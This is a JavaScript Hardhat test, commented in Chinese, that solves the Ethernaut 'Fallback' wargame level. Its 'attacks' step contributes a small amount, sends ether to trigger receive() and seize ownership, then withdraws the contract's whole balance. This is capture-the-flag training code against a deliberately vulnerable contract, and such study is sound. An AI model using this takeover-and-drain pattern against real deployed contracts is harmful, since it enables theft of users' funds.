const { expect } = require("chai");
const { ethers } = require("hardhat");
var tools = require("./tools");

describe("01Fallback", function () {
  let player, levelOwner, levelContract;

  it("setup", async function () {
    [player, levelOwner, levelContract] = await tools.initLevel("Fallback");
    //存些余额进去
    await levelOwner.sendTransaction({
      to: levelContract.address,
      value: ethers.utils.parseEther("0.1"),
    });
    //检查原始的owner和余额
    expect(await levelContract.owner()).to.not.equal(player.address);
    expect(await tools.getBalance(levelContract.address)).to.equal(
      ethers.utils.parseEther("0.1")
    );
  });

  it("attacks", async function () {
    //调用合约的contribute方法
    await levelContract.connect(player).contribute({
      value: ethers.utils.parseEther("0.0001"),
    });
    //转账触发receive()，修改owner
    await player.sendTransaction({
      to: levelContract.address,
      value: ethers.utils.parseEther("0.0001"),
    });
    //取掉所有的余额
    await levelContract.connect(player).withdraw();
  });

  it("check", async function () {
    //检查通过条件
    expect(await levelContract.owner()).to.equal(player.address);
    expect(await tools.getBalance(levelContract.address)).to.equal(0);
  });
});
